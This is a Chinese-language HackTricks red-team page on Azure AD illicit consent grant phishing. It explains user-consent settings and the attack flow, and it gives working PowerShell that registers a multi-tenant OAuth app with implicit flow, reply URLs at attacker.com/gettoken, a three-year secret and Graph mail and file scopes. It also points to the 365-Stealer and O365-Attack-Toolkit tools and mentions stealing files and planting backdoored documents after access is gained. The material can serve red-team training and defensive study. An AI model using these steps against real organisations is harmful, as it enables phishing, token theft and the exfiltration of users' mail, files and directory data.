# Az - 非法同意授予

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## OAuth应用程序钓鱼

**Azure应用程序**请求访问**用户数据**的权限（基本信息，还可以访问文档，发送电子邮件等）。\
如果**允许**，普通用户只能为**“低影响权限”**授予同意。在**所有其他**情况下，**需要管理员同意**。\
`GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator`和包括`允许向应用程序授予权限`的自定义角色可以提供租户范围的同意。

只有**不需要管理员同意**的权限被分类为**低影响**。这些是用于**基本登录的权限**，如openid、profile、email、User.Read和offline\_access。如果**组织****允许**用户对**所有应用程序**进行同意，员工可以同意应用程序**从其个人资料中读取上述信息**。

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

因此，攻击者可以准备一个**恶意应用程序**，通过**钓鱼**使用户**接受该应用程序并窃取其数据**。

### 2种非法同意授予攻击类型

* **未经身份验证**：从外部帐户创建一个具有权限`User.Read`和`User.ReadBasic.All`的应用程序，例如，钓鱼一个用户，然后您将能够访问目录信息。
* 这需要被钓鱼的用户能够接受来自外部环境的OAuth应用程序！
* **经过身份验证**：已经破坏了具有足够特权的主体，创建一个帐户内的应用程序，并钓鱼一些可以接受特权OAuth权限的特权用户。
* 在这种情况下，您已经可以访问目录信息，因此权限`User.ReadBasic.All`不再有趣。
* 您可能对**需要管理员授予的权限**感兴趣，因为原始用户无法为OAuth应用程序授予任何权限，这就是为什么您需要**只钓鱼那些用户**（稍后将详细介绍哪些角色/权限授予了此特权）

### 检查用户是否允许同意

以下PowerShell命令用于检查Azure Active Directory（Azure AD）中用户的同意配置，以确定他们是否能够同意应用程序：
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **禁用用户同意**: 此设置禁止用户向应用程序授予权限。不允许用户同意任何应用程序。
* **用户可以同意来自经过验证的发布者或您的组织的应用程序，但仅限您选择的权限**: 此设置允许所有用户仅同意由经过验证的发布者发布的应用程序和在您自己的租户中注册的应用程序。它通过仅允许特定权限的同意添加了一层控制。
* **用户可以同意所有应用程序**: 此设置更为宽松，允许所有用户同意任何应用程序的权限，只要这些权限不需要管理员同意。
* **自定义应用程序同意策略**: 此设置表示已制定了自定义策略，可根据特定组织要求进行定制，并可能涉及基于应用程序发布者、应用程序请求的权限和其他因素的限制组合。

## **理解非法同意授予攻击**

在非法同意授予攻击中，攻击者欺骗最终用户向在Azure中注册的恶意应用程序授予权限。这是通过使应用程序看起来合法，导致受害者在不知情的情况下点击“接受”按钮来实现的。结果，Azure AD向攻击者的站点发放令牌，使其能够访问和操纵受害者的数据，例如读取或发送电子邮件和访问文件，而无需组织帐户。

## **攻击流程概述**

攻击涉及针对一家通用公司的几个步骤。以下是攻击可能展开的方式：

1. **域名注册和应用程序托管**: 攻击者注册一个类似可信站点的域名，例如“safedomainlogin.com”。在此域名下，创建一个子域（例如“companyname.safedomainlogin.com”）来托管一个旨在捕获授权代码并请求访问令牌的应用程序。
2. **在Azure AD中注册应用程序**: 然后，攻击者在其Azure AD租户中注册一个多租户应用程序，将其命名为目标公司，以显得合法。他们将应用程序的重定向URL配置为指向托管恶意应用程序的子域。
3. **设置权限**: 攻击者使用各种API权限（例如`Mail.Read`、`Notes.Read.All`、`Files.ReadWrite.All`、`User.ReadBasic.All`、`User.Read`）设置应用程序。一旦用户授予这些权限，攻击者就可以代表用户提取敏感信息。
4. **分发恶意链接**: 攻击者制作一个包含恶意应用程序的客户端ID的链接，并与目标用户共享，欺骗他们同意授予权限。

## **利用工具进行攻击**

攻击可以利用诸如[**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)之类的工具来实施。

### 攻击前准备:

如果攻击者对受害组织中的某个用户具有一定程度的访问权限，他们可能会检查组织的政策是否允许用户接受应用程序：
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
为执行攻击，攻击者需要在其Azure租户中创建一个**新的应用程序**（在应用程序注册中），配置了以下权限：

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`位于`Microsoft Graph`中的`委托权限`中。（应用程序权限始终需要额外批准）。

* `User.ReadBasic.All`是一个权限，如果被授予，将允许您**读取组织中所有用户的信息**。
* 请记住，只有`GA`、`ApplicationAdministrator`、`CloudApplication Administrator`和包括`授予应用程序权限的权限`的自定义角色可以提供租户范围的同意。因此，如果您希望他批准**需要管理员同意的应用程序**，则应**钓鱼一个具有这些角色之一的用户**。

您还可以通过cli创建一个应用程序：
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

查看[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) 以了解如何配置。

{% hint style="warning" %}
请注意，获取的**访问令牌**将用于**图终结点**，具有范围：`User.Read` 和 `User.ReadBasic.All`（请求的权限）。您将无法执行其他操作（但这已足以**下载组织中所有用户的信息**）。
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

您还可以使用此工具执行此攻击。

## 后渗透

一旦您获得用户访问权限，您可以执行诸如窃取敏感文件甚至上传带后门的文档文件等操作。

## 参考资料

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 格式的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们**。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
